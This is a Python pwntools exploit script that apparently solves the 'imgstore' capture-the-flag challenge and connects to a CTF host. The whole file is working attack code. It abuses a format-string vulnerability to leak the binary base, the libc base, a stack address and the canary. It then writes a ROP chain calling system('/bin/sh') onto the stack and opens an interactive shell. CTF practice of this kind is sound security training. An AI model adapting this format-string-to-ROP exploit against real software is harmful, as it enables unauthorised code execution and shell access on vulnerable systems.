from pwn import *
from icecream import ic

elf = exe = ELF("./imgstore_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("imgstore.chal.imaginaryctf.org", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x1ee1
pie b 0x1ecd
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak(ind):
    ru("Enter book title: ")
    sl(b"%" + str(ind).encode() + b"$p")
    ru("Book title --> ")
    leek = int(rl().strip().decode(), 16)
    sla(b"[y/n]: ", b'y')
    return leek

def write(payload):
    ru("Enter book title: ")
    sl(payload)
    sla(b"[y/n]: ", b'y')

sla(b">>", b"3")
elf.address = leak(6) - 0x6060
libc.address = leak(9) - 0x90e93
stack_address = leak(15) - 0x18
canary = leak(17)

ic(hex(elf.address))
ic(hex(libc.address))
ic(hex(canary))

pop_rdi = libc.address + 0x0000000000023b6a
binsh = libc.address + 0x1b45bd
ret = elf.address + 0x000000000000101a
system = libc.sym['system']

def splitt(towrite, addr):
    ic(hex(addr))
    value1 = int(hex(addr)[2:-8], 16)
    ic(hex(value1))
    value2 = int(hex(addr)[-8:], 16)
    ic(hex(value2))
    payload = fmtstr_payload(8, {towrite : value2}, write_size='short')
    write(payload)
    payload = fmtstr_payload(8, {towrite+4 : value1}, write_size='short')
    write(payload)

splitt(stack_address, pop_rdi)
splitt(stack_address+8, binsh)
splitt(stack_address+16, ret)
splitt(stack_address+24, system)


ru("Enter book title: ")
sl(b'a')
sla(b"[y/n]: ", b'n')


io.interactive()
